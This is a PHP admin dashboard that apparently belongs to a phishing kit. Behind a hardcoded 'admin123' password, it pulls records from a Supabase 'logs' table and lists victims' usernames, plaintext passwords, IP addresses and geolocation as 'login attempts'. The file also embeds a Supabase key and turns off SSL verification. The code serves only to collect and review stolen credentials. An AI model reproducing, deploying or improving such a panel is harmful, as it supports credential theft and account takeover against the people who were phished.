<?php
// ============================================
// DASHBOARD - Read logs from Supabase
// ============================================

session_start();

$admin_password = 'admin123'; // ← CHANGE THIS!

if (isset($_POST['login_password'])) {
    if ($_POST['login_password'] === $admin_password) {
        $_SESSION['admin_logged_in'] = true;
        header('Location: dashboard.php');
        exit;
    } else {
        $error = "❌ Incorrect password!";
    }
}

if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    // Show login form (same as before)
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Login</title>
        <style>
            body { font-family: 'Segoe UI', Arial, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
            .login-box { background: #fff; padding: 40px; border-radius: 8px; max-width: 400px; width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
            .login-box h1 { text-align: center; }
            .login-box input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
            .login-box button { width: 100%; padding: 12px; background: #0067b8; color: #fff; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; }
            .error { color: red; text-align: center; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h1>🔐 Admin Login</h1>
            <form method="POST">
                <input type="password" name="login_password" placeholder="Enter password" required>
                <button type="submit">Access Dashboard</button>
                <?php if (isset($error)) echo '<p class="error">' . $error . '</p>'; ?>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ============================================
// YOUR SUPABASE CREDENTIALS
// ============================================
$supabaseUrl = 'https://eqqdjscfogwwshzdrdnw.supabase.co';
$supabaseKey = 'sb_publishable_7rVfq5jdsbhvXikHvXfNbA_x5ZxRisl';
// ============================================

$entries = [];
$total = 0;

$url = $supabaseUrl . '/rest/v1/logs?order=created_at.desc&limit=100';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'apikey: ' . $supabaseKey,
    'Authorization: Bearer ' . $supabaseKey
]);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

if ($result) {
    $entries = json_decode($result, true) ?? [];
    $total = count($entries);
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Dashboard</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f5f5f5; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 1px solid #ddd; margin-bottom: 30px; flex-wrap: wrap; }
        .header h1 { font-size: 28px; }
        .header-actions a { padding: 10px 20px; background: #0067b8; color: #fff; text-decoration: none; border-radius: 4px; margin-left: 10px; display: inline-block; }
        .header-actions a:hover { background: #005da6; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-bottom: 30px; }
        .stat-card { background: #fff; padding: 20px; text-align: center; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
        .stat-card .number { font-size: 32px; font-weight: 700; color: #0067b8; }
        .stat-card .label { color: #666; font-size: 14px; margin-top: 5px; }
        .table-wrapper { background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.05); overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; min-width: 700px; }
        th { background: #f8f9fa; padding: 15px 20px; text-align: left; border-bottom: 1px solid #e0e0e0; font-size: 12px; text-transform: uppercase; color: #666; }
        td { padding: 15px 20px; border-bottom: 1px solid #f0f0f0; }
        tr:hover td { background: #f8f9fa; }
        .empty { text-align: center; padding: 60px 20px; color: #999; }
        .footer { text-align: center; color: #999; padding: 20px; margin-top: 30px; border-top: 1px solid #ddd; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📊 #1 Login Dashboard</h1>
            <div class="header-actions">
                <a href="dashboard.php">⟳ Refresh</a>
                <a href="../settings/index.php">⚙️ Settings</a>
                <a href="dashboard.php?logout=1">🚪 Logout</a>
            </div>
        </div>

        <div class="stats">
            <div class="stat-card"><div class="number"><?php echo $total; ?></div><div class="label">Total Attempts</div></div>
            <div class="stat-card"><div class="number"><?php echo count(array_unique(array_column($entries, 'ip'))); ?></div><div class="label">Unique IPs</div></div>
        </div>

        <div class="table-wrapper">
            <table>
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Username</th>
                        <th>Password</th>
                        <th>IP</th>
                        <th>Location</th>
                        <th>Continent</th>
                        <th>Time</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if (empty($entries)): ?>
                        <tr><td colspan="7"><div class="empty">📭 No login attempts yet</div></td></tr>
                    <?php else: ?>
                        <?php foreach ($entries as $i => $entry): ?>
                            <tr>
                                <td><?php echo $i + 1; ?></td>
                                <td><strong><?php echo htmlspecialchars($entry['username'] ?? '-'); ?></strong></td>
                                <td><code><?php echo htmlspecialchars($entry['password'] ?? '-'); ?></code></td>
                                <td><?php echo htmlspecialchars($entry['ip'] ?? '-'); ?></td>
                                <td><?php echo htmlspecialchars(($entry['city'] ?? '') . ', ' . ($entry['country'] ?? '')); ?></td>
                                <td><?php echo htmlspecialchars($entry['continent'] ?? '-'); ?></td>
                                <td><?php echo htmlspecialchars($entry['created_at'] ?? '-'); ?></td>
                            </tr>
                        <?php endforeach; ?>
                    <?php endif; ?>
                </tbody>
            </table>
        </div>
        <div class="footer">📁 Logs stored in Supabase | Total: <?php echo $total; ?></div>
    </div>
</body>
</html>
